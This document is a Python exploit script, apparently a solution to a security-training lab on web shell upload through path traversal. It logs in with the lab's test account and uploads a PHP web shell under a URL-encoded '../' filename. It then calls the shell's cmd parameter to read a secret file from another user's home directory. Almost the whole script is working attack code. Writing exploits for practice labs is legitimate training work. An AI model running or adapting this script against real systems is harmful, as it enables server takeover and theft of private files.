# Lab: Web shell upload via path traversal
import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import os
from dotenv import load_dotenv

load_dotenv()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

with open("get.php", 'rb') as file:
    php_file_content = file.read()

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT")
}


def get_csrf_token(s, url):
    r = s.get(url + "/login", verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    print(csrf_token)
    return csrf_token


def get_secret(s, url):
    avatar_url = url + "/files/webs.php?cmd=/home/carlos/secret"
    r = s.get(avatar_url, verify=False, proxies=proxies)
    print(r.text)


def login(s, url, csrf):
    data = {"csrf": csrf, "username": "wiener", "password": "peter"}
    r = s.post(url + "/login", data=data, verify=False, proxies=proxies)

    if r.status_code == 200:
        print("(-> Successfully logged in!")
    else:
        print("(-) Couldn't log in")


def web_shell_upload(s, url):
    avatar_path = "/my-account/avatar"
    csrf = get_csrf_token(s, url)
    login(s, url, csrf)
    data = {"user": "wiener", "csrf": csrf}

    files = {
        "avatar": ("%2e%2e%2fwebs.php", php_file_content, "application/x-php"),
    }

    r = requests.post(url + avatar_path, files=files, verify=False, proxies=proxies)


    if r.status_code == 200:
        print("(-> Successfully uploaded web shell")
        print("(-> Extracting secrets from carlos")
        get_secret(s, url)
    else:
        print('(-) Exploit failed.')
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(-> Exploiting web shell upload via path traversal...")
    s = requests.Session()
    web_shell_upload(s, url)


if __name__ == "__main__":
    main()
